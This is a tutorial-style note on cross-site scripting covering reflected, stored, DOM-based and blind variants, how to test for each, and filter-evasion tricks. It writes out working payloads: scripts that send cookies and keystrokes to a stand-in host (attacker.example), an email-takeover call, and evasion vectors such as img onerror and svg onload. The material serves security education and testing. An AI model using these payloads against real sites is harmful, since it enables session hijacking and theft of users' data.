## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a class of vulnerabilities wherein malicious JavaScript is injected into a web application, then executed by other unsuspecting users. XSS attacks can result in account compromise, data leakage, or even network pivoting, depending on the context of the targeted web application and the level of access gained. This note provides a deep technical overview of different XSS varieties, typical payloads, and testing methodologies.

---

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [What is XSS?](#what-is-xss)
3. [Building XSS Payloads](#building-xss-payloads)
4. [Types of XSS](#types-of-xss)
   - [Reflected XSS](#reflected-xss)
   - [Stored XSS](#stored-xss)
   - [DOM-Based XSS](#dom-based-xss)
   - [Blind XSS](#blind-xss)
5. [Evading Filters & Payload Modifications](#evading-filters--payload-modifications)
6. [Summary & Additional Resources](#summary--additional-resources)

---

## 1. Prerequisites

1. **JavaScript Basics**: Understanding variable scoping, basic JavaScript syntax, and typical APIs (e.g., `document.cookie`, `fetch`, event listeners).
2. **HTTP Requests & Responses**: Familiarity with how data flows between client and server, including query parameters, headers, and request bodies.
3. **Web Application Structure**: Understanding of HTML/DOM, common frameworks, and user input handling.

---

## 2. What is XSS?

Cross-Site Scripting (XSS) is categorized as an **injection attack** where malicious JavaScript is inserted into a web application. Once injected, the script executes on the client side (i.e., in a victim’s browser), allowing attackers to:
- Steal cookies or session tokens (Session Hijacking).
- Perform arbitrary actions as the victim (CSRF-like effects).
- Log keystrokes or personal information.
- Modify the web page to display misleading information (Defacement).

### Real-World Impact
XSS vulnerabilities remain a top issue in web security (as highlighted by OWASP’s Top 10). They’re widely reported across major platforms (e.g., Google, Facebook, various bug bounty programs), often yielding high rewards for responsible disclosure.

---

## 3. Building XSS Payloads

In XSS, the **payload** is the snippet of JavaScript (or HTML/JS combination) that executes on the victim’s browser. Each payload comprises:

1. **Intention**: The end goal (e.g., stealing cookies, logging keystrokes, demonstrating the vulnerability via an alert).
2. **Modification**: Adaptations to ensure the payload can bypass filters, fit into the specific context (HTML, JavaScript string, attribute, etc.), or evade certain sanitization attempts.

### Example Intentions

1. **Proof of Concept (PoC)**
   ```html
   <script>alert('XSS');</script>
   ```
   - Shows an alert box to confirm script execution.

2. **Session Stealing**
   ```html
   <script>
   fetch('https://attacker.example/steal?cookie=' + btoa(document.cookie));
   </script>
   ```
   - Sends the victim’s cookie (Base64-encoded) to an attacker-controlled endpoint.

3. **Key Logger**
   ```html
   <script>
   document.onkeypress = function(e) {
       fetch('https://attacker.example/log?key=' + btoa(e.key));
   };
   </script>
   ```
   - Captures and exfiltrates each keystroke to the attacker.

4. **Business Logic Manipulation**
   ```html
   <script>user.changeEmail('attacker@evil.com');</script>
   ```
   - Calls a privileged JavaScript function to alter user data.

---

## 4. Types of XSS

### 4.1 Reflected XSS

**Definition:**
Reflected XSS occurs when **user-supplied data** is included in an HTTP response immediately, without adequate sanitization. This often involves query parameters or form submissions that are echoed back in error messages or page content.

**Technical Example:**
An application appends an `error` parameter in the query string to an HTML page:
```
GET /login?error=<script>alert('ReflectedXSS');</script>
```
If the page responds by directly inserting that parameter into the HTML, the malicious script will execute:

```html
<html>
<body>
<p>There was an error: <script>alert('ReflectedXSS');</script></p>
</body>
</html>
```

**Potential Impact:**
- Attackers can craft malicious links embedding the XSS payload.
- Victims who click these links have arbitrary JS executed in their browsers.
- This may steal sessions, redirect users, or deface the site.

**Testing Reflected XSS:**
1. Inspect **all GET/POST parameters** (including hidden fields, AJAX data, etc.).
2. Insert test payloads (`<script>alert('Test')</script>`) to see if they are echoed.
3. Escalate by adding advanced payloads if initial tests reflect data unfiltered.
4. Use browser dev tools or proxy (e.g., Burp Suite) to quickly alter parameters.

---

### 4.2 Stored XSS

**Definition:**
Stored (or Persistent) XSS occurs when the malicious payload is **permanently stored** on the server (e.g., in a database, comment field, or message board). Other users then load the malicious script simply by visiting the infected page.

**Technical Example:**
- A blog’s comment form allows HTML tags without sanitization.
- Attacker submits a comment:

  ```html
  <script>alert('StoredXSS');</script>
  ```

- Every user who views the blog post will trigger the script.

**Potential Impact:**
- Larger attack surface since every visitor is susceptible.
- Allows for more complex payloads (keyloggers, session stealing, advanced business logic exploitation).
- Harder to detect if the injection is stealthy or obfuscated.

**Testing Stored XSS:**
1. Enumerate all user-input forms that display data back to other users:
   - Comments, chat systems, user profile sections, product reviews, etc.
2. Attempt basic HTML/JS injections and confirm if they persist in the application.
3. If basic attempts fail, consider **client-side** form validations vs. **server-side** validations. You can bypass client-side checks by sending crafted POST requests or intercepting the request with a proxy.

---

### 4.3 DOM-Based XSS

**Definition:**
DOM-Based XSS operates entirely within the **Document Object Model** in the user’s browser. No server-side reflection is needed; the web page’s own JavaScript reads from sources like `window.location.hash` or `document.referrer` and injects it back into the page without proper validation.

**Technical Example:**
A page uses the hash fragment to display user-specific content:

```html
<script>
  // Example: http://victim.site/#name=<script>alert('DOMXSS')</script>
  var hashValue = window.location.hash.substr(1);
  // Insecurely inject into DOM
  document.getElementById("display").innerHTML = hashValue;
</script>
<div id="display"></div>
```

When an attacker crafts `http://victim.site/#name=<script>alert('DOMXSS')</script>`, the script is inserted into the page’s DOM directly, causing execution.

**Potential Impact:**
- Full control of the page’s DOM environment, reading or manipulating elements, forms, cookies, etc.
- Attacker can create clickable links that execute malicious JS upon page load.

**Testing DOM-Based XSS:**
1. **Review client-side scripts** for calls like `document.write`, `innerHTML`, `eval`, or direct assignments using `location`, `hash`, `search`, or `referrer`.
2. Inject known patterns (like `<script>alert('DOMXSS')</script>`) into those parameters.
3. Monitor console or logs to see if the code executes (some frameworks do tricky transformations, so watch carefully).

---

### 4.4 Blind XSS

**Definition:**
Blind XSS is similar to Stored XSS, but the attacker **cannot directly see** the result of their injection. Typically, it targets administrative or support interfaces where an attacker’s crafted data is viewed later by privileged staff.

**Technical Example:**
- A public “Contact Us” form allows submission of messages.
- Staff read these messages in a separate admin portal.
- The attacker includes a hidden XSS payload:

  ```html
  <script>
    fetch('https://attacker.example/blind?' + btoa(document.cookie));
  </script>
  ```

- Once an admin opens the ticket, the code executes on their machine, sending back cookies or internal portal data to the attacker.

**Potential Impact:**
- High value: often executed in high-privileged contexts (e.g., an admin session).
- Can exfiltrate or manipulate sensitive data in private dashboards.

**Testing Blind XSS:**
1. Use a callback domain (e.g., [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter-express) or self-hosted solution) to record any requests triggered by your payload.
2. Insert payloads into all fields that staff or other privileged users may eventually view.
3. Wait and monitor the logs: if the staff interface loads your payload, you’ll see requests from the victim’s environment.

---

## 5. Evading Filters & Payload Modifications

Modern web applications often employ filters or sanitizers that remove or neutralize obvious `<script>` tags. Attackers use **evasive techniques** to bypass these protections:

1. **HTML Entity Encoding**
   - Using `&#x3C;script&#x3E;` instead of `<script>` to hide from naive string matching.
2. **Image or SVG Payloads**
   - `<img src=x onerror=alert(1)>`
   - `<svg onload=alert(1)>`
3. **JavaScript Protocols**
   - `javascript:alert('XSS')` in a hyperlink’s `href`.
4. **Event Handlers**
   - `<a href="#" onclick=alert('XSS')>Click Me</a>`
5. **Polyglots / In-line JS**
   - Combining HTML, CSS, and JS in unconventional ways to bypass WAF rules (e.g., `"><script>alert(1)</script>` or nested `<script>` tags).
6. **DOM Manipulation**
   - Using Angular, React, or Vue-specific injection vectors if the site is using those frameworks (e.g., AngularJS sandbox bypasses).

**Key Consideration:**
Always consider the **context** in which your payload is inserted. For instance, an injection inside an HTML attribute vs. inside a `<script>` block vs. in a JSON response each require different evasion or encoding methods.

---

## 6. Summary & Additional Resources

**Summary**
- XSS is a pervasive and dangerous web vulnerability allowing arbitrary JavaScript execution.
- Reflected XSS uses immediate echoing of unvalidated input.
- Stored XSS persists malicious scripts in a database or data store.
- DOM-Based XSS is purely client-side, exploiting insecure JavaScript operations on user-controllable data.
- Blind XSS has the payload triggered in a context the attacker cannot directly see, often in admins’ or staff’s browsers.

**Additional Resources**
- **OWASP XSS Cheat Sheet**: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
- **MDN Web Docs**: [https://developer.mozilla.org/en-US/docs/Web/JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
- **DOM XSS Explanation**: [https://www.owasp.org/index.php/DOM_Based_XSS](https://www.owasp.org/index.php/DOM_Based_XSS)
- **W3C DOM Introduction**: [https://www.w3.org/TR/REC-DOM-Level-1/](https://www.w3.org/TR/REC-DOM-Level-1/)

> **Pro Tip**: Effective XSS hunting involves a mix of creativity and technical precision. If a direct `<script>` injection fails, explore alternative injection vectors, inspect JavaScript frameworks in use, and thoroughly review client-side code for potential DOM-based injection points.

By combining knowledge of JavaScript, web protocols, and defensive coding practices, security professionals and attackers alike can identify or exploit XSS vulnerabilities. As always, ensuring **proper input validation, output encoding, and a robust Content Security Policy (CSP)** are among the best defenses against XSS in production environments.
